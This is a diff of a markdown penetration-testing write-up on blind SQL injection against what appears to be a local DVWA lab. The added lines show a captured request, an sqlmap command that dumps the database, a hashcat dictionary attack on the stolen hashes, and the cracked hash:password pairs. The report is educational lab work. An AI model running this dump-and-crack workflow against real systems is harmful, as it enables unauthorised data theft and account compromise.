@@ -1,7 +1,5 @@
-# SQL Injection Remote Code Execution Report
----
-title: "2023-07-10-BLIND-SQLI-REPORT"
----
+# Blind SQL Injection Remote Code Execution Report
+
 
 ## Table of Contents
 - [**Outline**](#section-0)
@@ -26,19 +24,62 @@ The goal of this write-up is to document and demonstrate Blind SQL Injection vul
 | Path        | http://127.0.0.1/vulnerabilities/sqli/ |
 
 
-SQL injection is a security vulnerability that allows attackers to manipulate SQL queries executed by a web application's database. In addition, Blind SQL injection is a type of SQL injection vulnerability, however, the HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. This vulnerability poses a significant threat to the Confidentiality, Integrity, and Availability (CIA) triad of a system, as it can result in data breaches, unauthorized data disclosure, data manipulation,  and potential system downtime. It may also lead to a full compromise of a system through Remote Code Execution. 
+SQL injection is a security vulnerability that allows attackers to manipulate SQL queries executed by a web application's database.  
+
+![](/assets/sqlb/map.png)   
+In addition, Blind SQL injection is a type of SQL injection vulnerability, however, the HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.  
+
+![](/assets/sqlb/map2.png)   
+
+This vulnerability poses a significant threat to the Confidentiality, Integrity, and Availability (CIA) triad of a system, as it can result in data breaches, unauthorized data disclosure, data manipulation,  and potential system downtime. It may also lead to a full compromise of a system through Remote Code Execution. 
 
 
 ## Proof of Concept {#section-2}
-To exploit the vulnerability, the tester utilized SQLMap.  SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in web applications. As such, SQLMap automatically identifies vulnerable parameters and SQL injection techniques to use depending on the Database Management System (DBSM).
-
-
 ### Automating the Process SQLMap 
 
+To exploit the vulnerability, the tester utilized SQLMap.  SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in web applications. As such, SQLMap automatically identifies vulnerable parameters and SQL injection techniques to use depending on the Database Management System (DBSM).
 
-### Manual Enumeration & Exploitation
+The tester first intercepted the SQL query with Burp Suite and fed SQLmap with the intercepted data. This  captured  request file was named `hack`
+![](/assets/sqlb/intercept.png)   
 
 
+```bash
+echo 'GET /vulnerabilities/sqli_blind/?id=2&Submit=Submit HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://127.0.0.1/vulnerabilities/sqli_blind/?id=1&Submit=Submit
+Cookie: PHPSESSID=dse3mdg76nb5nbp3sg3md8g651; security=low
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1' > hack
+
+``` 
+Next the tester ran SQLmap with the `--dump` parameter  to exploit a SQL injection vulnerability in a web application. The `--dump` option extracts and retrieves the contents of the database,  revealing sensitive data stored within the data base.
+
+```bash
+sqlmap -r hack  --dump
+```
+![](/assets/sqlb/result.gif)   
+
+
+Next, the tester extracted the saved data base password using hashcat.
+ ```bash
+ hashcat -a 0 -m 0  /tmp/sqlmapsioqi_7q979443/sqlmaphashes-v4n117tp.txt /usr/share/wordlists/rockyou.txt --show
+ ```
+The tester was able to retrieve the passwords for all the users with ease.
+```bash
+8d3533d75ae2c3966d7e0d4fcc69216b:charley
+5f4dcc3b5aa765d61d8327deb882cf99:password
+e99a18c428cb38d5f260853678922e03:abc123
+0d107d09f5bbe40cade3de5c71e9e9b7:letmein
+
+```
 
 
 ## Source Code Analysis {#section-3}
